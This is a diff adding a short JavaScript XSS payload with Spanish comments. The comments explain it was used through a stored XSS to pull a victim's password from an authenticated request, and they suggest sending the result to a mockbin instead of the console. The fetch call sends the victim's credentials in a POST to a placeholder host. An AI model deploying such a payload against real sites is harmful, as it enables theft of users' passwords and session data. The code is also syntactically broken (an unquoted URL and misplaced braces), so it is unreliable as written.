@@ -1,0 +1,26 @@
+//fetch a una web utilizando post e imprimir el resultado
+//se creó en un contexto en el que en una de las peticiones de la web viajaba información sensible
+//se encontró un XSS almacenado que no necesitaba interacción del usuario, por lo que devolvía su contraseña
+//debería mandarse a un mockbin y no imprimirlo en la consola, obviamente
+
+var formData = new FormData();
+formData.append('param1', 'value1');
+formData.append('param2', 'value2');
+
+ fetch(https://test.com, {
+
+          method: "POST", headers: {
+                    //modmmificar las cabeceras a tu gusto
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'Accept': '*/*',
+                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-origin',
+                    }, credentials: 'include' , body: formData)
+
+        })
+.then(response => response.text()) 
+.then(console.log) 
+.catch(console.error);
